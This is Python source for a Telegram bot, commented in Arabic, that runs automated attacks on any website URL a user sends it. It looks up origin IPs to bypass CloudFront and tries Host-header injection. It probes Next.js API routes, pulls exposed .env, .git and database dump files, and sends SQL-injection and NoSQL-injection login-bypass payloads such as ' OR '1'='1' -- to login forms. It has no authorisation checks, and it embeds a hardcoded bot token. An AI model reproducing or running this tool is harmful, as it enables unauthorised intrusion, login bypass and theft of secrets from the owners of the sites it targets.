import asyncio
import requests
import socket
import dns.resolver
import re
import json
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = "1933471238:AAHCB_GMbIZanMExNEHn9YFaz5RlzIXLcF0"

# ========== أدوات الفحص المتقدمة ==========

def find_origin_ip(domain):
    """محاولة إيجاد IP الأصلي للسيرفر متجاوزين CloudFront"""
    results = []
    
    # 1. فحص DNS تاريخي عبر SecurityTrails-style (محاكاة)
    try:
        # فحص A records كلها
        answers = dns.resolver.resolve(domain, 'A')
        for rdata in answers:
            ip = str(rdata)
            # فحص إذا كان IP تابع لـ AWS CloudFront
            if not ip.startswith(("52.", "54.", "204.", "205.", "216.", "13.", "15.", "18.", "3.", "99.")):
                results.append(f"⚠️ IP غير AWS: {ip} - ممكن يكون Origin IP!")
    except:
        pass
    
    # 2. فحص Subdomains
    subdomains = ["www", "mail", "ftp", "admin", "api", "dev", "staging", "test", 
                  "beta", "cdn", "static", "blog", "shop", "app", "direct", "origin",
                  "backend", "internal", "proxy", "lb", "loadbalancer", "web", "server",
                  "ns1", "ns2", "mx", "smtp", "pop", "imap", "cpanel", "whm", "phpmyadmin"]
    
    for sub in subdomains:
        subdomain = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(subdomain)
            # إذا IP مختلف عن CloudFront IPs
            if not ip.startswith(("52.", "54.", "204.", "205.", "216.", "13.", "15.", "18.", "3.", "99.")):
                results.append(f"🔍 {subdomain} → {ip} (غير AWS!)")
            else:
                results.append(f"ℹ️ {subdomain} → {ip} (AWS)")
        except:
            pass
    
    return results

def cloudfront_bypass_host_header(url):
    """محاولة bypass CloudFront عن طريق تغيير Host header"""
    findings = []
    domain = urlparse(url).netloc
    ip = socket.gethostbyname(domain)
    
    # قائمة بـ Host headers محتملة
    hosts_to_try = [
        domain,
        f"www.{domain}",
        "localhost",
        "127.0.0.1",
        "0.0.0.0",
        f"admin.{domain}",
        f"internal.{domain}",
        "origin.awsdns-51.com",
        ip  # الـ IP نفسه
    ]
    
    for host in hosts_to_try:
        try:
            r = requests.get(f"http://{ip}", 
                           headers={"Host": host, "User-Agent": "Mozilla/5.0"},
                           timeout=5,
                           allow_redirects=False)
            if r.status_code != 403 and r.status_code != 502:
                findings.append(f"✅ Bypass بـ Host: {host} → {r.status_code}")
                if r.text != "" and "cloudfront" not in r.text.lower()[:500]:
                    findings.append(f"   📄 محتوى مختلف عن CloudFront!")
        except:
            pass
    
    return findings

def nextjs_api_deep_scan(url):
    """فحص عميق لمسارات API في Next.js"""
    base = url.rstrip("/")
    
    # مسارات API معروفة في Next.js
    api_routes = [
        "/api", "/api/auth", "/api/auth/session", "/api/auth/csrf",
        "/api/auth/providers", "/api/auth/callback",
        "/api/user", "/api/users", "/api/users/me",
        "/api/admin", "/api/admin/users", "/api/config",
        "/api/settings", "/api/data", "/api/status",
        "/api/health", "/api/healthcheck", "/api/ping",
        "/api/login", "/api/register", "/api/logout",
        "/api/products", "/api/orders", "/api/payments",
        "/api/items", "/api/categories", "/api/search",
        "/api/graphql", "/api/rest", "/api/v1", "/api/v2",
        "/_next/data/development.json",
        "/_next/data/production.json",
        "/_next/static/development/_buildManifest.js",
        "/_next/static/chunks/pages/login.js",
        "/_next/static/chunks/pages/index.js",
        "/api/trpc",  # tRPC
        "/api/action",  # Next.js 14+ server actions
    ]
    
    found = []
    for route in api_routes:
        try:
            r = requests.get(f"{base}{route}", 
                           timeout=5, 
                           headers={
                               "User-Agent": "Mozilla/5.0",
                               "Accept": "application/json",
                               "X-Forwarded-For": "127.0.0.1"
                           },
                           allow_redirects=False)
            
            if r.status_code == 200:
                # فحص إذا كان JSON
                try:
                    data = r.json()
                    found.append(f"🔴 {route} (200 OK) - JSON API مكشوف!")
                    # عرض البنية
                    if isinstance(data, dict):
                        keys = list(data.keys())[:10]
                        found.append(f"   Keys: {keys}")
                    elif isinstance(data, list):
                        found.append(f"   Array length: {len(data)}")
                except:
                    if len(r.text) > 50:
                        found.append(f"🟡 {route} (200 OK) - محتوى ${len(r.text)} بايت")
                    else:
                        found.append(f"🟢 {route} (200 OK) - '{r.text[:100]}'")
            elif r.status_code == 403:
                found.append(f"🟠 {route} (403 Forbidden) - موجود لكن محمي")
            elif r.status_code == 401:
                found.append(f"🟠 {route} (401 Unauthorized) - يتطلب مصادقة")
            elif r.status_code == 405:
                found.append(f"ℹ️ {route} (405 Method Not Allowed) - جرّب POST")
            elif r.status_code == 500:
                found.append(f"🔴 {route} (500 Internal Error) - خطأ في السيرفر!")
        except:
            pass
    
    return found

def check_system_files(url):
    """فحص ملفات النظام والتكوين"""
    base = url.rstrip("/")
    files = [
        "/.env", "/.env.local", "/.env.production",
        "/.git/config", "/.git/HEAD",
        "/.htaccess", "/.htpasswd",
        "/config.json", "/config.js",
        "/package.json", "/next.config.js",
        "/vercel.json", "/now.json",
        "/Dockerfile", "/docker-compose.yml",
        "/nginx.conf", "/web.config",
        "/robots.txt", "/sitemap.xml",
        "/security.txt", "/.well-known/security.txt",
        "/backup.tar.gz", "/backup.zip", "/dump.sql",
        "/db.sqlite", "/database.sqlite",
        "/phpinfo.php", "/info.php", "/test.php",
        "/crossdomain.xml", "/clientaccesspolicy.xml",
        "/wsdl", "/soap", "/xmlrpc.php",
        "/wp-admin", "/wp-content", "/wp-includes",
        "/admin", "/administrator", "/manager",
        "/phpMyAdmin", "/phpmyadmin",
        "/server-status", "/server-info",
        "/actuator", "/actuator/health",  # Spring Boot
        "/swagger.json", "/api-docs", "/openapi.json",
        "/graphql", "/graphiql", "/playground"
    ]
    
    found = []
    for file in files:
        try:
            r = requests.get(f"{base}{file}", 
                           timeout=5, 
                           headers={"User-Agent": "Mozilla/5.0"},
                           allow_redirects=False)
            if r.status_code == 200 and len(r.text) > 0:
                found.append(f"🔴 {file} (200 OK) - ⚠️ موجود!")
                # عرض أول سطرين كعينة
                lines = r.text.strip().split("\n")[:3]
                for line in lines:
                    if line.strip():
                        found.append(f"   {line.strip()[:100]}")
            elif r.status_code == 403:
                found.append(f"🟠 {file} (403 Forbidden)")
            elif r.status_code == 301 or r.status_code == 302:
                found.append(f"ℹ️ {file} ({r.status_code}) → {r.headers.get('Location', 'N/A')}")
        except:
            pass
    
    return found

def login_page_attack(url):
    """فحص صفحة الدخول بثغرات متقدمة"""
    findings = []
    login_url = f"{url.rstrip('/')}/login"
    
    try:
        # جلب صفحة login
        s = requests.Session()
        r = s.get(login_url, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
        soup = BeautifulSoup(r.text, "html.parser")
        forms = soup.find_all("form")
        
        findings.append(f"📝 عدد الفورم: {len(forms)}")
        
        for form in forms:
            action = form.get("action", login_url)
            method = form.get("method", "get").upper()
            inputs = form.find_all("input")
            
            findings.append(f"\n🔍 Form → {action} ({method})")
            
            form_data = {}
            for inp in inputs:
                name = inp.get("name", "")
                inp_type = inp.get("type", "text")
                if name:
                    findings.append(f"   📌 {name} (type: {inp_type})")
                    
                    # محاولة هجمات
                    if inp_type == "password" or "password" in name.lower():
                        # SQLi على كلمة المرور
                        sqli_payloads = ["' OR '1'='1' --  ", "\" OR \"1\"=\"1\" --  ", "admin' --  "]
                        for payload in sqli_payloads:
                            try:
                                data = {}
                                for inp2 in inputs:
                                    n = inp2.get("name", "")
                                    t = inp2.get("type", "")
                                    if n:
                                        if t == "password" or "password" in n.lower():
                                            data[n] = payload
                                        elif "email" in n.lower() or "user" in n.lower():
                                            data[n] = "admin"
                                        elif "_token" in n.lower() or "csrf" in n.lower():
                                            data[n] = inp2.get("value", "")
                                        else:
                                            data[n] = "test"
                                
                                if method == "POST":
                                    resp = s.post(urljoin(url, action), data=data, timeout=5, allow_redirects=False)
                                else:
                                    resp = s.get(urljoin(url, action), params=data, timeout=5, allow_redirects=False)
                                
                                if resp.status_code == 302 or "welcome" in resp.text.lower() or "dashboard" in resp.text.lower():
                                    findings.append(f"   ✅ SQLi Bypass ناجح ← {payload}")
                                    break
                            except:
                                pass
            
            # فحص NoSQL Injection (لـ MongoDB)
            nosql_payloads = ['{"$gt": ""}', '{"$ne": ""}', '{"$regex": ".*"}']
            findings.append(f"   🧪 NoSQL Injection check...")
            for payload in nosql_payloads:
                try:
                    data = {}
                    for inp2 in inputs:
                        n = inp2.get("name", "")
                        t = inp2.get("type", "")
                        if n:
                            if t == "password" or "password" in n.lower() or "user" in n.lower() or "email" in n.lower():
                                data[n] = payload
                            elif "_token" in n.lower() or "csrf" in n.lower():
                                data[n] = inp2.get("value", "")
                            else:
                                data[n] = "test"
                    
                    headers = {"Content-Type": "application/json"}
                    if "email" in str(inputs).lower() or "user" in str(inputs).lower():
                        # محاولة JSON body
                        try:
                            resp = s.post(urljoin(url, action), json=data, timeout=5, allow_redirects=False)
                            if resp.status_code == 302 or "dashboard" in resp.text.lower():
                                findings.append(f"   ✅ NoSQL Injection ← {payload}")
                                break
                        except:
                            pass
                except:
                    pass
    
    except Exception as e:
        findings.append(f"❌ خطأ: {str(e)}")
    
    return findings

async def full_pentest(url):
    """الفحص الكامل"""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    
    domain = urlparse(url).netloc
    reports = []
    reports.append("=" * 55)
    reports.append("☠️  تقرير الاختراق المتقدم - Advanced Penetration Test")
    reports.append(f"🎯 {url}")
    reports.append(f"🌐 Domain: {domain}")
    reports.append("=" * 55)
    
    # 1. Origin IP Discovery
    reports.append("\n🔎 **1. اكتشاف خادم الأصلي (Origin IP)**")
    origin_ips = find_origin_ip(domain)
    if origin_ips:
        for oip in origin_ips:
            reports.append(f"   {oip}")
        reports.append("\n   💡 نصيحة: استخدم IP الأصلي لتجاوز CloudFront")
    else:
        reports.append("   لم يتم العثور على Origin IP")
    
    # 2. CloudFront Bypass
    reports.append("\n🚀 **2. تجاوز CloudFront (Host Header Injection)**")
    bypass = cloudfront_bypass_host_header(url)
    if bypass:
        for b in bypass:
            reports.append(f"   {b}")
    else:
        reports.append("   لم نتمكن من تجاوز CloudFront")
    
    # 3. Next.js API Deep Scan
    reports.append("\n⚡ **3. فحص مسارات Next.js API**")
    api = nextjs_api_deep_scan(url)
    if api:
        for a in api:
            reports.append(f"   {a}")
    else:
        reports.append("   ✅ لم يتم العثور على مسارات API مكشوفة")
    
    # 4. System Files
    reports.append("\n📁 **4. ملفات النظام والتكوين**")
    sys_files = check_system_files(url)
    if sys_files:
        for sf in sys_files:
            reports.append(f"   {sf}")
    else:
        reports.append("   ✅ لا توجد ملفات حساسة مكشوفة")
    
    # 5. Login Attack
    reports.append("\n🔐 **5. هجوم صفحة الدخول**")
    login = login_page_attack(url)
    if login:
        for l in login:
            reports.append(f"   {l}")
    
    # 6. Directory Bruteforce (قائمة موسعة)
    reports.append("\n📂 **6. فحص المسارات (Directory Bruteforce)**")
    dirs = [
        "/admin", "/dashboard", "/panel", "/control",
        "/user", "/users", "/profile", "/profile/1", "/profile/admin",
        "/settings", "/account", "/orders", "/checkout",
        "/cart", "/wishlist", "/favorites",
        "/search", "/search?q=test",
        "/blog", "/news", "/about", "/contact",
        "/support", "/help", "/faq",
        "/terms", "/privacy",
        "/download", "/uploads", "/files",
        "/images", "/img", "/assets",
        "/css", "/js", "/fonts",
        "/static", "/public", "/media",
        "/api-docs", "/docs", "/documentation",
        "/graphql", "/playground",
        "/swagger", "/swagger-ui",
        "/.well-known", "/.well-known/security.txt",
        "/sockjs-node", "/webpack-hmr"  # Dev mode
    ]
    found_dirs = []
    base = url.rstrip("/")
    for d in dirs:
        try:
            r = requests.get(f"{base}{d}", timeout=5, headers={"User-Agent": "Mozilla/5.0"}, allow_redirects=False)
            if r.status_code == 200:
                found_dirs.append(f"   🔴 {d} (200)")
            elif r.status_code == 403:
                found_dirs.append(f"   🟠 {d} (403)")
            elif r.status_code == 401:
                found_dirs.append(f"   🟠 {d} (401)")
            elif r.status_code == 301 or r.status_code == 302:
                found_dirs.append(f"   ℹ️ {d} ({r.status_code})")
        except:
            pass
    
    if found_dirs:
        for fd in found_dirs[:25]:
            reports.append(fd)
        if len(found_dirs) > 25:
            reports.append(f"   ...و {len(found_dirs)-25} إضافية")
    else:
        reports.append("   لا توجد مسارات إضافية")
    
    # 7. فحص NoSQL Injection موسع
    reports.append("\n🗄️ **7. فحص NoSQL Injection**")
    reports.append("   تم الفحص في مرحلة Login Attack أعلاه")
    
    # 8. الخلاصة
    reports.append("\n" + "=" * 55)
    reports.append("🏁 **الخلاصة والتوصيات**")
    reports.append("-" * 55)
    
    total_issues = 0
    if sys_files:
        total_issues += len(sys_files) * 2
    if origin_ips:
        total_issues += 2
    if bypass:
        total_issues += 3
    if api:
        total_issues += len(api) * 2
    if found_dirs:
        total_issues += len(found_dirs)
    
    reports.append(f"📊 إجمالي المشاكل المكتشفة: درجة {total_issues}/100")
    if total_issues > 15:
        reports.append("🔴 **تصنيف: موقع ضعيف جداً - يحتاج تدخل فوري!**")
    elif total_issues > 5:
        reports.append("🟠 **تصنيف: متوسط - يحتاج تحسينات أمنية**")
    else:
        reports.append("🟢 **تصنيف: جيد - لكن دائماً في مجال للتحسين**")
    
    reports.append("=" * 55)
    
    return "\n".join(reports)

# ========== البوت ==========

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "☠️ **بوت الاختراق المتقدم v3.0**\n\n"
        "🍀 الميزات:\n"
        "🔎 اكتشاف Origin IP (تجاوز CloudFront)\n"
        "🚀 Host Header Injection Bypass\n"
        "⚡ فحص Next.js API Routes\n"
        "📁 فحص ملفات النظام\n"
        "🔐 هجوم صفحة الدخول (SQLi + NoSQL)\n"
        "📂 Directory Bruteforce\n\n"
        "أرسل الرابط لبدء الفحص المتكامل"
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    url = update.message.text.strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    
    await update.message.reply_text("🔍 جاري الفحص المتقدم... قد يستغرق دقيقة أو دقيقتين")
    
    try:
        report = await full_pentest(url)
        if len(report) > 4000:
            parts = [report[i:i+4000] for i in range(0, len(report), 4000)]
            for part in parts:
                await update.message.reply_text(part, parse_mode="Markdown")
        else:
            await update.message.reply_text(report, parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"❌ خطأ: {str(e)}")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("🤖 بوت الاختراق المتقدم يعمل...")
    app.run_polling()

if __name__ == "__main__":
    main()